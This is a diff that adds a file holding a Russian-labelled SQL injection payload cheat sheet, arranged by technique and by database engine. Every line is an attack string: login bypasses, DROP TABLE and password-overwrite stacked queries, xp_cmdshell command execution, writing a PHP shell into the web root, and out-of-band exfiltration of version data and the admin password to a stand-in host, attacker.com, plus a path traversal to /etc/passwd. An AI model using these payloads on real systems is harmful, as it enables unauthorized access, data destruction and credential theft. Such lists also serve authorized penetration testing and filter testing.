@@ -1,0 +1,47 @@
+Классические SQL-инъекции
+	' OR '1'='1
+	' OR '1'='1' --
+	' OR '1'='1' #
+	' OR 1=1 --
+	admin' --
+
+Error-based инъекции
+	' AND extractvalue(rand(),concat(0x3a,version())) --
+	' AND updatexml(rand(),concat(0x3a,version()),null) --
+	Использование floor(rand()*2) для вызова ошибок
+
+Blind SQL-инъекции (слепые)
+	Boolean-based:
+		' AND 1=1 --  (если страница загружается нормально)
+		' AND 1=2 --  (если страница ведет себя иначе)
+		' AND substring(version(),1,1)='5' --
+	Time-based:
+		' AND SLEEP(5) --
+	' OR IF(1=1,SLEEP(5),0) --
+	' ; WAITFOR DELAY '00:00:05' --  (для SQL Server)
+	
+Stacked queries
+	'; DROP TABLE users --
+	'; UPDATE users SET password='hacked' WHERE username='admin' --
+
+Out-of-band инъекции
+	'; EXEC master..xp_dirtree '\\attacker.com\share' --
+	' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\test')) --
+	
+MySQL:
+	' ORDER BY 10 --  (определение количества колонок)
+	' INTO OUTFILE '/var/www/shell.php' --
+	
+PostgreSQL:
+	'::text
+	'; COPY users TO '/tmp/stolen' --
+	
+SQL Server:
+	'; EXEC xp_cmdshell 'whoami' --
+	'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker';'sa';'password','SELECT 1') --
+	
+Oracle:
+	' AND (SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='admin')) FROM dual) IS NOT NULL --
+	
+Path Traversal:
+	../../../../etc/passwd
